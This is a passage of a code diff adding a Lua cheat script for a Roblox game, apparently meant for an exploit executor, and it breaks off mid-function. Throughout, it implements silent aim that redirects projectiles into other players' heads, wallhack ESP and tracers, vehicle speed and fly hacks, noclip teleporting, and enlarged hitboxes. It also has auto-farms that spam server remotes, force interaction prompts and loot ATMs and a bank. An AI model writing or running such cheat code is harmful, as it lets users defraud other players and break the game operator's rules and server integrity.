+        silentAimActiveStroke.Color = silentEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        silentAimActiveBtn.BackgroundColor3 = silentEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runSilentAim)
+
+-- Flamethrower Silent Aim: Nearest
+local function runFlameSilentNearest()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local mouse = LP:GetMouse()
+    local camera = workspace.CurrentCamera
+    local bulletsFolder = workspace:WaitForChild("Bullets")
+    local enabled = false; local connection; local trackedBullets = {}; local lockedTarget = nil; local highlight
+
+    local function removeHighlight() if highlight then highlight:Destroy(); highlight=nil end end
+    local function applyHighlight(plr)
+        removeHighlight()
+        if plr and plr.Character then
+            highlight = Instance.new("Highlight", plr.Character)
+            highlight.FillColor = Color3.fromRGB(180,50,255)
+            highlight.OutlineColor = Color3.fromRGB(180,50,255)
+        end
+    end
+
+    bulletsFolder.ChildAdded:Connect(function(b)
+        if not enabled or not b:IsA("BasePart") then return end
+        trackedBullets[b] = lockedTarget
+    end)
+
+    local function update()
+        local t = getNearestToMouse(LP, mouse, camera)
+        if t then lockedTarget = t; applyHighlight(lockedTarget) end
+        for b in pairs(trackedBullets) do
+            if not b or not b.Parent then trackedBullets[b] = nil
+            elseif lockedTarget and lockedTarget.Character then
+                local part = lockedTarget.Character:FindFirstChild("Head") or lockedTarget.Character:FindFirstChild("HumanoidRootPart")
+                if part then b.CFrame = CFrame.new(part.Position) end
+            end
+        end
+    end
+
+    flameSilentAllBtn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        flameSilentAllStroke.Color = enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        flameSilentAllBtn.BackgroundColor3 = enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if enabled then
+            if connection then connection:Disconnect() end
+            connection = RunService.RenderStepped:Connect(update)
+        else
+            if connection then connection:Disconnect(); connection=nil end
+            lockedTarget=nil; trackedBullets={}; removeHighlight()
+        end
+    end)
+end
+task.spawn(runFlameSilentNearest)
+
+-- Flamethrower Aim All
+local function runFlameAimAll()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local bulletsFolder = workspace:WaitForChild("Bullets")
+    local enabled = false; local trackedBullets = {}
+
+    bulletsFolder.ChildAdded:Connect(function(b)
+        if not enabled or not b:IsA("BasePart") then return end
+        trackedBullets[b] = true
+        task.spawn(function()
+            while trackedBullets[b] and b.Parent do
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p ~= LP and p.Character then
+                        local part = p.Character:FindFirstChild("Head") or p.Character:FindFirstChild("HumanoidRootPart")
+                        if part then b.CFrame = CFrame.new(part.Position); task.wait(0.001) end
+                    end
+                end
+                RunService.RenderStepped:Wait()
+            end
+        end)
+    end)
+
+    flameAimAllBtn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        flameAimAllStroke.Color = enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        flameAimAllBtn.BackgroundColor3 = enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if not enabled then trackedBullets = {} end
+    end)
+end
+task.spawn(runFlameAimAll)
+
+-- RPG Silent Aim
+local function runRPGSilent()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local mouse = LP:GetMouse()
+    local camera = workspace.CurrentCamera
+    local bulletsFolder = workspace:WaitForChild("Bullets")
+    local enabled = false; local connection; local trackedBullets = {}; local lockedTarget = nil; local highlight
+    local BULLET_SPEED = 500
+
+    local function removeHighlight() if highlight then highlight:Destroy(); highlight=nil end end
+    local function applyHighlight(plr)
+        removeHighlight()
+        if plr and plr.Character then
+            highlight = Instance.new("Highlight", plr.Character)
+            highlight.FillColor = Color3.fromRGB(200,80,255)
+            highlight.OutlineColor = Color3.fromRGB(200,80,255)
+        end
+    end
+
+    bulletsFolder.ChildAdded:Connect(function(b)
+        if not enabled or not b:IsA("MeshPart") then return end
+        b.CanCollide = false
+        local ti = b:FindFirstChildWhichIsA("TouchTransmitter")
+        if ti then ti:Destroy() end
+        if not lockedTarget then lockedTarget = getNearestToMouse(LP, mouse, camera) end
+        if lockedTarget then trackedBullets[b] = lockedTarget end
+    end)
+
+    local function updateBullets(dt)
+        local closest = getNearestToMouse(LP, mouse, camera)
+        if closest ~= lockedTarget then applyHighlight(closest); lockedTarget = closest end
+        for b, target in pairs(trackedBullets) do
+            if not b or not b.Parent or not target or not target.Character then
+                trackedBullets[b] = nil
+            else
+                local part = target.Character:FindFirstChild("Head") or target.Character:FindFirstChild("HumanoidRootPart")
+                if part then
+                    local dir = part.Position - b.Position
+                    local step = dir.Unit * BULLET_SPEED * dt
+                    if step.Magnitude > dir.Magnitude then step = dir end
+                    b.CFrame = CFrame.new(b.Position + step)
+                end
+            end
+        end
+    end
+
+    rpgSilentBtn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        rpgSilentStroke.Color = enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        rpgSilentBtn.BackgroundColor3 = enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if enabled then
+            if connection then connection:Disconnect() end
+            connection = RunService.RenderStepped:Connect(function(dt) updateBullets(dt) end)
+        else
+            if connection then connection:Disconnect(); connection=nil end
+            lockedTarget=nil; trackedBullets={}; removeHighlight()
+        end
+    end)
+end
+task.spawn(runRPGSilent)
+
+-- Vehicle Speed/Accel/Braking/Fly
+local function runVehicleMods()
+    local Workspace = game:GetService("Workspace")
+    local UIS = game:GetService("UserInputService")
+    local RunService = game:GetService("RunService")
+
+    -- Speed
+    local vSpeedActive = false
+    local function setSpeed(v) for _,vh in ipairs(Workspace:WaitForChild("Vehicles"):GetChildren()) do if vh:IsA("Model") then local e=vh:FindFirstChild("Engine") if e and e:GetAttribute("forwardMaxSpeed")~=nil then e:SetAttribute("forwardMaxSpeed",v) end end end end
+    vSpeedBtn.MouseButton1Click:Connect(function()
+        if not vSpeedActive then local v=tonumber(vSpeedBox.Text) if v then setSpeed(v); vSpeedStroke.Color=Color3.fromRGB(100,255,100); vSpeedBtn.BackgroundColor3=Color3.fromRGB(30,80,30); vSpeedActive=true end
+        else setSpeed(45); vSpeedStroke.Color=Color3.fromRGB(130,50,180); vSpeedBtn.BackgroundColor3=Color3.fromRGB(55,18,80); vSpeedActive=false end
+    end)
+
+    -- Accel
+    local vAccelActive = false
+    local function setAccel(v) for _,vh in ipairs(Workspace:WaitForChild("Vehicles"):GetChildren()) do if vh:IsA("Model") then local e=vh:FindFirstChild("Engine") if e and e:GetAttribute("acceleration")~=nil then e:SetAttribute("acceleration",v) end end end end
+    vAccelBtn.MouseButton1Click:Connect(function()
+        if not vAccelActive then local v=tonumber(vAccelBox.Text) if v then setAccel(v); vAccelStroke.Color=Color3.fromRGB(100,255,100); vAccelBtn.BackgroundColor3=Color3.fromRGB(30,80,30); vAccelActive=true end
+        else setAccel(25); vAccelStroke.Color=Color3.fromRGB(130,50,180); vAccelBtn.BackgroundColor3=Color3.fromRGB(55,18,80); vAccelActive=false end
+    end)
+
+    -- Braking
+    local vBrakeActive = false
+    local function setBrake(v) for _,vh in ipairs(Workspace:WaitForChild("Vehicles"):GetChildren()) do if vh:IsA("Model") then local e=vh:FindFirstChild("Engine") if e and e:GetAttribute("braking")~=nil then e:SetAttribute("braking",v) end end end end
+    vBrakeBtn.MouseButton1Click:Connect(function()
+        if not vBrakeActive then local v=tonumber(vBrakeBox.Text) if v then setBrake(v); vBrakeStroke.Color=Color3.fromRGB(100,255,100); vBrakeBtn.BackgroundColor3=Color3.fromRGB(30,80,30); vBrakeActive=true end
+        else setBrake(105); vBrakeStroke.Color=Color3.fromRGB(130,50,180); vBrakeBtn.BackgroundColor3=Color3.fromRGB(55,18,80); vBrakeActive=false end
+    end)
+
+    -- Fly
+    local LP = game:GetService("Players").LocalPlayer
+    local Char = LP.Character or LP.CharacterAdded:Wait()
+    local Humanoid = Char:WaitForChild("Humanoid")
+    local HRP = Char:WaitForChild("HumanoidRootPart")
+    local Camera = workspace.CurrentCamera
+    local ORIG_GRAVITY = workspace.Gravity
+    local FK = {W=false,A=false,S=false,D=false,Space=false,LeftShift=false}
+    local flying = false; local flyConn
+
+    LP.CharacterAdded:Connect(function(c)
+        Char=c; Humanoid=c:WaitForChild("Humanoid"); HRP=c:WaitForChild("HumanoidRootPart")
+    end)
+
+    local function updateFlight()
+        if not flying or not HRP then return end
+        local seat = Humanoid.SeatPart
+        if not seat or not seat:IsA("VehicleSeat") then
+            flying=false; workspace.Gravity=ORIG_GRAVITY
+            vFlyStroke.Color=Color3.fromRGB(130,50,180); vFlyBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+            if flyConn then flyConn:Disconnect(); flyConn=nil end; return
+        end
+        local md=Vector3.new(0,0,0)
+        if FK.W then md+=Camera.CFrame.LookVector end
+        if FK.S then md-=Camera.CFrame.LookVector end
+        if FK.A then md-=Camera.CFrame.RightVector end
+        if FK.D then md+=Camera.CFrame.RightVector end
+        if FK.Space then md+=Vector3.new(0,1,0) end
+        if FK.LeftShift then md-=Vector3.new(0,1,0) end
+        if md.Magnitude>0 then md=md.Unit end
+        local sp=tonumber(vFlyBox.Text) or 50
+        local model=seat:FindFirstAncestorOfClass("Model")
+        if model and model.PrimaryPart then model:SetPrimaryPartCFrame(model.PrimaryPart.CFrame+(md*sp*0.1)) end
+    end
+
+    vFlyBtn.MouseButton1Click:Connect(function()
+        if flying then
+            if flyConn then flyConn:Disconnect(); flyConn=nil end
+            workspace.Gravity=ORIG_GRAVITY; flying=false
+            vFlyStroke.Color=Color3.fromRGB(130,50,180); vFlyBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+        else
+            local seat=Humanoid.SeatPart
+            if not seat or not seat:IsA("VehicleSeat") then return end
+            workspace.Gravity=0; flying=true
+            vFlyStroke.Color=Color3.fromRGB(100,255,100); vFlyBtn.BackgroundColor3=Color3.fromRGB(30,80,30)
+            flyConn=RunService.Heartbeat:Connect(updateFlight)
+        end
+    end)
+
+    UIS.InputBegan:Connect(function(i,gp) if gp then return end local k=i.KeyCode
+        if k==Enum.KeyCode.W then FK.W=true elseif k==Enum.KeyCode.A then FK.A=true
+        elseif k==Enum.KeyCode.S then FK.S=true elseif k==Enum.KeyCode.D then FK.D=true
+        elseif k==Enum.KeyCode.Space then FK.Space=true elseif k==Enum.KeyCode.LeftShift then FK.LeftShift=true end
+    end)
+    UIS.InputEnded:Connect(function(i,gp) if gp then return end local k=i.KeyCode
+        if k==Enum.KeyCode.W then FK.W=false elseif k==Enum.KeyCode.A then FK.A=false
+        elseif k==Enum.KeyCode.S then FK.S=false elseif k==Enum.KeyCode.D then FK.D=false
+        elseif k==Enum.KeyCode.Space then FK.Space=false elseif k==Enum.KeyCode.LeftShift then FK.LeftShift=false end
+    end)
+end
+task.spawn(runVehicleMods)
+
+-- ========================= VISUALS TAB SCRIPTS =========================
+local function runVisuals()
+    local Players = game:GetService("Players")
+    local LP = Players.LocalPlayer
+    local RunService = game:GetService("RunService")
+    local Workspace = game:GetService("Workspace")
+    local espToggles = {PlayerEsp=false,ItemEsp=false,MoneyEsp=false,RobberyEsp=false,Tracers=false}
+    local highlights = {PlayerEsp={},ItemEsp={},MoneyEsp={},RobberyEsp={},Tracers={}}
+
+    local function clearHL(t)
+        for _, h in ipairs(highlights[t]) do if h and h.Parent then h:Destroy() end end
+        highlights[t] = {}
+    end
+
+    local function createBoxHL(part, color, t)
+        local h = Instance.new("BoxHandleAdornment")
+        h.Adornee=part; h.Size=part.Size; h.Color3=color
+        h.AlwaysOnTop=true; h.ZIndex=10; h.Transparency=0.3; h.Parent=part
+        table.insert(highlights[t], h)
+    end
+
+    local function updatePlayerESP()
+        clearHL("PlayerEsp")
+        if not espToggles.PlayerEsp then return end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then
+                local h = p.Character:FindFirstChildOfClass("Highlight")
+                if not h then h = Instance.new("Highlight", p.Character); table.insert(highlights.PlayerEsp, h) end
+                local tc = p.Team and p.Team.TeamColor
+                h.FillColor = tc and tc.Color or Color3.fromRGB(180,80,255)
+                h.OutlineColor = Color3.fromRGB(220,150,255)
+                h.FillTransparency = 0.4
+                if not p.Character:FindFirstChild("7v2Tag") then
+                    local bb = Instance.new("BillboardGui", p.Character)
+                    bb.Name = "7v2Tag"; bb.Adornee = p.Character:FindFirstChild("Head")
+                    bb.Size = UDim2.new(0,180,0,38); bb.StudsOffset = Vector3.new(0,3,0); bb.AlwaysOnTop=true
+                    local tl = Instance.new("TextLabel", bb)
+                    tl.Size = UDim2.new(1,0,1,0); tl.BackgroundTransparency=1
+                    tl.Text = p.Name; tl.TextColor3 = Color3.fromRGB(220,170,255)
+                    tl.TextSize=14; tl.TextStrokeTransparency=0.5
+                    tl.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold)
+                    table.insert(highlights.PlayerEsp, bb)
+                end
+            end
+        end
+    end
+
+    local function updateRobberyESP()
+        clearHL("RobberyEsp")
+        if not espToggles.RobberyEsp then return end
+        local d = Workspace:FindFirstChild("Damageables")
+        if d then for _,o in ipairs(d:GetChildren()) do
+            if o:IsA("Model") and o.PrimaryPart then createBoxHL(o.PrimaryPart,Color3.fromRGB(255,140,0),"RobberyEsp")
+            elseif o:IsA("BasePart") then createBoxHL(o,Color3.fromRGB(255,140,0),"RobberyEsp") end
+        end end
+        for _,o in ipairs(Workspace:GetChildren()) do
+            if o:IsA("Model") and o.Name:lower():find("atm") and o.PrimaryPart then
+                createBoxHL(o.PrimaryPart,Color3.fromRGB(255,200,0),"RobberyEsp")
+            end
+        end
+    end
+
+    local function updateItemESP()
+        clearHL("ItemEsp")
+        if not espToggles.ItemEsp then return end
+        local pi = Workspace:FindFirstChild("PickUpItems")
+        if pi then for _,o in ipairs(pi:GetChildren()) do
+            if (o:IsA("MeshPart") or o:IsA("UnionOperation")) and o.CanCollide then createBoxHL(o,Color3.fromRGB(100,255,100),"ItemEsp") end
+        end end
+    end
+
+    local function updateMoneyESP()
+        clearHL("MoneyEsp")
+        if not espToggles.MoneyEsp then return end
+        local cf = Workspace:FindFirstChild("Cash")
+        if cf then for _,p in ipairs(cf:GetChildren()) do
+            if p:IsA("BasePart") and p.Name=="Cash" then
+                local h = Instance.new("Highlight", p)
+                h.FillColor=Color3.fromRGB(100,255,100); h.OutlineColor=Color3.fromRGB(100,255,100)
+                table.insert(highlights.MoneyEsp, h)
+            end
+        end end
+    end
+
+    local function updateTracers()
+        clearHL("Tracers")
+        if not espToggles.Tracers then return end
+        local lc = LP.Character
+        if not lc or not lc:FindFirstChild("HumanoidRootPart") then return end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local beam = Instance.new("Beam")
+                beam.FaceCamera=true; beam.Color=ColorSequence.new(Color3.fromRGB(180,80,255))
+                beam.Width0=0.5; beam.Width1=0.5; beam.Transparency=NumberSequence.new(0.4)
+                local a0 = Instance.new("Attachment", lc.HumanoidRootPart)
+                local a1 = Instance.new("Attachment", p.Character.HumanoidRootPart)
+                beam.Attachment0=a0; beam.Attachment1=a1; beam.Parent=Workspace
+                table.insert(highlights.Tracers,beam); table.insert(highlights.Tracers,a0); table.insert(highlights.Tracers,a1)
+            end
+        end
+    end
+
+    local function setupESPToggle(btn, stroke, key, fn)
+        btn.MouseButton1Click:Connect(function()
+            espToggles[key] = not espToggles[key]
+            stroke.Color = espToggles[key] and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+            btn.BackgroundColor3 = espToggles[key] and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+            fn()
+        end)
+    end
+
+    setupESPToggle(playerEspBtn, playerEspStroke, "PlayerEsp", updatePlayerESP)
+    setupESPToggle(itemEspBtn, itemEspStroke, "ItemEsp", updateItemESP)
+    setupESPToggle(moneyEspBtn, moneyEspStroke, "MoneyEsp", updateMoneyESP)
+    setupESPToggle(robberyEspBtn, robberyEspStroke, "RobberyEsp", updateRobberyESP)
+    setupESPToggle(tracersBtn, tracersStroke, "Tracers", updateTracers)
+
+    local lastUpdate = 0
+    RunService.Heartbeat:Connect(function()
+        if tick()-lastUpdate < 0.5 then return end; lastUpdate = tick()
+        if espToggles.PlayerEsp then updatePlayerESP() end
+        if espToggles.ItemEsp then updateItemESP() end
+        if espToggles.MoneyEsp then updateMoneyESP() end
+        if espToggles.RobberyEsp then updateRobberyESP() end
+        if espToggles.Tracers then updateTracers() end
+    end)
+end
+task.spawn(runVisuals)
+
+-- ========================= FARMS TAB SCRIPTS =========================
+
+-- Nails Farm
+local function runNailsFarm()
+    local Players = game:GetService("Players")
+    local RS = game:GetService("ReplicatedStorage")
+    local Workspace = game:GetService("Workspace")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local running = false
+    local punchFolder = Workspace:WaitForChild("SalonPunch")
+    local fightPos = CFrame.new(512,12,-275)
+    local moving = false; local noclipConn
+
+    local function enableNoclip(char)
+        return RunService.Stepped:Connect(function()
+            for _,p in pairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
+        end)
+    end
+    local function tweenTo(hrp, targetCF)
+        moving=true; noclipConn=enableNoclip(hrp.Parent)
+        while moving do
+            local dir=targetCF.Position-hrp.Position
+            if dir.Magnitude<=20 then
+                local tw=TweenService:Create(hrp,TweenInfo.new(0.35,Enum.EasingStyle.Linear),{CFrame=targetCF})
+                tw:Play(); tw.Completed:Wait(); break
+            end
+            local tw=TweenService:Create(hrp,TweenInfo.new(0.35,Enum.EasingStyle.Linear),{CFrame=hrp.CFrame+dir.Unit*20})
+            tw:Play(); tw.Completed:Wait()
+        end
+        moving=false
+        if noclipConn then noclipConn:Disconnect(); noclipConn=nil end
+    end
+    local function modifyParts()
+        for _,p in ipairs(punchFolder:GetDescendants()) do
+            if p:IsA("BasePart") then p.Size=Vector3.new(100,100,100); p.CanCollide=false; p.Transparency=1 end
+        end
+    end
+    local function spamPunch()
+        while running do
+            pcall(function() if RS:FindFirstChild("PUNCHEVENT") then RS:WaitForChild("PUNCHEVENT"):FireServer(1) end end)
+            task.wait(0.3)
+        end
+    end
+    nailsFarmBtn.MouseButton1Click:Connect(function()
+        running=not running
+        nailsFarmStroke.Color=running and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        nailsFarmBtn.BackgroundColor3=running and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if running then
+            task.spawn(function()
+                local char=LP.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    coroutine.wrap(function() tweenTo(char.HumanoidRootPart, fightPos) end)()
+                    task.wait(0.2); modifyParts(); task.spawn(spamPunch)
+                end
+            end)
+        end
+    end)
+end
+task.spawn(runNailsFarm)
+
+-- ATM Farm + Collect Cash
+local function runATMAndCash()
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+    local RS = game:GetService("ReplicatedStorage")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local Camera = Workspace.CurrentCamera
+    local LP = Players.LocalPlayer
+    local Char = LP.Character or LP.CharacterAdded:Wait()
+    local HRP = Char:WaitForChild("HumanoidRootPart")
+    local runningATM = false; local runningCash = false; local moving = false
+    local noclipConnection; local cameraEnabled = false
+
+    local function enableNoclip(character)
+        return RunService.Stepped:Connect(function()
+            for _,p in ipairs(character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
+        end)
+    end
+    RunService.RenderStepped:Connect(function()
+        if cameraEnabled and HRP and Camera then
+            Camera.CFrame=CFrame.new(HRP.Position+Vector3.new(0,10,0),HRP.Position+Vector3.new(0,-10,5))
+        end
+    end)
+    local function teleportTween(targetPos, speed)
+        moving=true; noclipConnection=enableNoclip(Char)
+        local fPos=targetPos+Vector3.new(0,4,0)
+        local dur=math.max((HRP.Position-fPos).Magnitude/speed,0.3)
+        local tw=TweenService:Create(HRP,TweenInfo.new(dur,Enum.EasingStyle.Linear),{CFrame=CFrame.new(fPos)})
+        tw:Play(); tw.Completed:Wait(); moving=false
+        if noclipConnection then noclipConnection:Disconnect(); noclipConnection=nil end
+    end
+    local function modifyDamageables()
+        local folder=Workspace:FindFirstChild("Damageables")
+        if folder then for _,m in ipairs(folder:GetChildren()) do
+            for _,p in ipairs(m:GetDescendants()) do
+                if p:IsA("BasePart") then p.Transparency=1; p.Size=Vector3.new(1000,1000,1000); p.CanCollide=false end
+            end
+        end end
+    end
+    local function autoPunch(dur)
+        local st=tick()
+        while tick()-st<dur and runningATM do
+            if RS:FindFirstChild("PUNCHEVENT") then RS.PUNCHEVENT:FireServer(1) end
+            task.wait(0.01)
+        end
+    end
+    local function destroySeatsLoop()
+        task.spawn(function()
+            while runningATM or runningCash do
+                for _,p in ipairs(Workspace:GetDescendants()) do
+                    if p:IsA("Seat") or p:IsA("VehicleSeat") then p:Destroy() end
+                end
+                task.wait(5)
+            end
+        end)
+    end
+    local function isUnderground(p) return (p.Position.Y-(p.Size.Y*0.5))<0 end
+    local function isBugged(p)
+        if not p:IsA("BasePart") then return true end
+        if p.Anchored then return true end
+        if p.Size.Magnitude<0.5 then return true end
+        return false
+    end
+    local function getClosestCash()
+        local folder=Workspace:FindFirstChild("Cash")
+        if not folder then return nil end
+        local closest,dist=nil,math.huge
+        for _,c in ipairs(folder:GetChildren()) do
+            if c:IsA("BasePart") and c.Name=="Cash" and not isUnderground(c) and not isBugged(c) then
+                local d=(HRP.Position-c.Position).Magnitude
+                if d<dist then closest=c; dist=d end
+            end
+        end
+        return closest
+    end
+    local function spamPrompt(prompt)
+        if not runningCash or not prompt then return end
+        if prompt:IsA("ProximityPrompt") and prompt.Enabled then
+            local origLOS=prompt.RequiresLineOfSight
+            prompt.RequiresLineOfSight=false; prompt.HoldDuration=0
+            local st=os.clock()
+            while runningCash and os.clock()-st<0.25 do
+                prompt:InputHoldBegin(); task.wait(0.02); prompt:InputHoldEnd(); task.wait(0.02)
+            end
+            prompt.RequiresLineOfSight=origLOS
+        end
+    end
+    local function collectCash()
+        while runningCash do
+            if not Char.Parent then
+                task.wait(3); Char=LP.Character or LP.CharacterAdded:Wait(); HRP=Char:WaitForChild("HumanoidRootPart")
+            end
+            local cash=getClosestCash()
+            if cash then
+                local allP={}
+                for _,p in ipairs(Workspace:GetDescendants()) do
+                    if p:IsA("ProximityPrompt") and not cash:IsAncestorOf(p) then p.Enabled=false; table.insert(allP,p) end
+                end
+                teleportTween(cash.Position,65)
+                while moving do task.wait() end
+                for _,pr in ipairs(cash:GetDescendants()) do
+                    if pr:IsA("ProximityPrompt") and pr.Enabled then spamPrompt(pr) end
+                end
+                for _,pr in ipairs(allP) do pr.Enabled=true end
+            else
+                teleportTween(Vector3.new(152,8,-486),50); task.wait(0.5)
+            end
+            task.wait(0.05)
+        end
+    end
+    task.spawn(function()
+        while true do
+            if runningATM or runningCash then
+                local net=RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Net") and RS.Modules.Net:FindFirstChild("RE/ChangePVP")
+                if net then net:FireServer() end
+            end
+            task.wait(0.01)
+        end
+    end)
+    atmBtn.MouseButton1Click:Connect(function()
+        runningATM=not runningATM
+        cameraEnabled=runningATM
+        atmStroke.Color=runningATM and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        atmBtn.BackgroundColor3=runningATM and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if runningATM then
+            collectCashStroke.Color=Color3.fromRGB(130,50,180); collectCashBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+            task.spawn(function()
+                modifyDamageables(); destroySeatsLoop()
+                task.spawn(function() while runningATM do autoPunch(10); task.wait(0.5) end end)
+                task.wait(2); runningCash=true
+                collectCashStroke.Color=Color3.fromRGB(100,255,100); collectCashBtn.BackgroundColor3=Color3.fromRGB(30,80,30)
+                task.spawn(collectCash)
+            end)
+        else cameraEnabled=false end
+    end)
+    collectCashBtn.MouseButton1Click:Connect(function()
+        runningCash=not runningCash
+        cameraEnabled=runningCash
+        collectCashStroke.Color=runningCash and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        collectCashBtn.BackgroundColor3=runningCash and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if runningCash then destroySeatsLoop(); task.spawn(collectCash)
+        else cameraEnabled=false end
+    end)
+end
+task.spawn(runATMAndCash)
+
+-- Auto Drop Cash
+local function runAutoDrop()
+    local RS = game:GetService("ReplicatedStorage")
+    local dropRemote = RS:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/walletDropCash")
+    local running = false
+    local function getAmount()
+        local v=tonumber(dropBox.Text)
+        if v and v>=1 and v<=20000 then return v end
+        return 1000
+    end
+    local function autoDrop()
+        while running do pcall(function() dropRemote:FireServer(getAmount()) end); task.wait(1) end
+    end
+    dropBtn.MouseButton1Click:Connect(function()
+        running=not running
+        dropStroke.Color=running and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        dropBtn.BackgroundColor3=running and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if running then task.spawn(autoDrop) end
+    end)
+end
+task.spawn(runAutoDrop)
+
+-- Bank Farm
+local function runBankFarm()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local TweenService = game:GetService("TweenService")
+    local Workspace = game:GetService("Workspace")
+    local Player = Players.LocalPlayer
+    local Char = Player.Character or Player.CharacterAdded:Wait()
+    local RootPart = Char:WaitForChild("HumanoidRootPart")
+    local Humanoid = Char:WaitForChild("Humanoid")
+    local checking = false; local inProcess = false; local hasEscaped = false
+    local moving = false; local noclipConnection
+    local safePoints = {
+        Vector3.new(894.467,6.193,2609.844),
+        Vector3.new(890.827,4.761,2605.365),
+        Vector3.new(884.827,2.761,2602.365)
+    }
+    local explodeWaitPos = CFrame.new(-61,9,627)
+
+    local function updateChar()
+        Char=Player.Character or Player.CharacterAdded:Wait()
+        RootPart=Char:WaitForChild("HumanoidRootPart"); Humanoid=Char:WaitForChild("Humanoid")
+    end
+    local function enableNoclip(character)
+        return RunService.Stepped:Connect(function()
+            for _,p in pairs(character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
+        end)
+    end
+    local function tweenToPosition(hrp, targetCFrame)
+        moving=true; noclipConnection=enableNoclip(hrp.Parent)
+        while moving do
+            local dir=targetCFrame.Position-hrp.Position
+            if dir.Magnitude<=20 then
+                local tw=TweenService:Create(hrp,TweenInfo.new(0.35,Enum.EasingStyle.Linear),{CFrame=targetCFrame})
+                tw:Play(); tw.Completed:Wait(); break
+            end
+            local tw=TweenService:Create(hrp,TweenInfo.new(0.35,Enum.EasingStyle.Linear),{CFrame=hrp.CFrame+dir.Unit*20})
+            tw:Play(); tw.Completed:Wait()
+        end
+        moving=false
+        if noclipConnection then noclipConnection:Disconnect(); noclipConnection=nil end
+    end
+    local function teleportTo(pos)
+        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+            coroutine.wrap(function() tweenToPosition(Player.Character.HumanoidRootPart, CFrame.new(pos)) end)()
+        end
+    end
+    local function fireBankPrompt()
+        local bank=Workspace:FindFirstChild("BANK")
+        if not bank then return false end
+        local bp=bank:FindFirstChild("ButtonPanel")
+        if not bp then return false end
+        local pp=bp:FindFirstChild("PromptPart")
+        if not pp then return false end
+        local prox=pp:FindFirstChild("ProximityPrompt")
+        if not prox then return false end
+        teleportTo(explodeWaitPos.Position); task.wait(2)
+        fireproximityprompt(prox); return true
+    end
+    local function grabAllCash()
+        local bank=Workspace:FindFirstChild("BANK")
+        if not bank then return end
+        local mbf=bank:FindFirstChild("MoneyBoxes")
+        if not mbf then return end
+        for _,mb in pairs(mbf:GetChildren()) do
+            if mb.Name=="MoneyBox" and mb:IsA("Model") then
+                local pp=mb:FindFirstChild("PromptPart")
+                if pp then local prox=pp:FindFirstChild("ProximityPrompt") if prox then fireproximityprompt(prox) end end
+            end
+        end
+    end
+    local function vaultIsClosed()
+        local bank=Workspace:FindFirstChild("BANK")
+        if not bank then return true end
+        return bank:FindFirstChild("MoneyBoxes")==nil
+    end
+    local function hasMoneyBoxes()
+        local bank=Workspace:FindFirstChild("BANK")
+        if not bank then return false end
+        local mbf=bank:FindFirstChild("MoneyBoxes")
+        if not mbf then return false end
+        return #mbf:GetChildren()>0
+    end
+    local function safeAFKTeleport()
+        for _,pt in ipairs(safePoints) do teleportTo(pt); task.wait(2) end
+    end
+    local function waitForMB()
+        while checking do if hasMoneyBoxes() then return true end; task.wait(0.5) end
+        return false
+    end
+    local function grabCashAtPositions()
+        local positions={Vector3.new(918,3,2590),Vector3.new(926,2,2612),Vector3.new(905,2,2607),Vector3.new(951,3,2608)}
+        for _,pos in ipairs(positions) do
+            if not checking then break end
+            teleportTo(pos); grabAllCash(); task.wait(1)
+        end
+    end
+    local function startFarming()
+        checking=true; hasEscaped=false; inProcess=false
+        spawn(function()
+            while checking do
+                if Char and RootPart then
+                    local tn=Player.Team and Player.Team.Name or "No Team"
+                    if tn=="Escaped" and not hasEscaped then
+                        teleportTo(Vector3.new(918.505,6.004,2593.403)); task.wait(2); hasEscaped=true
+                    elseif tn~="Escaped" and not hasEscaped then
+                        teleportTo(Vector3.new(851,5,534)); task.wait(2)
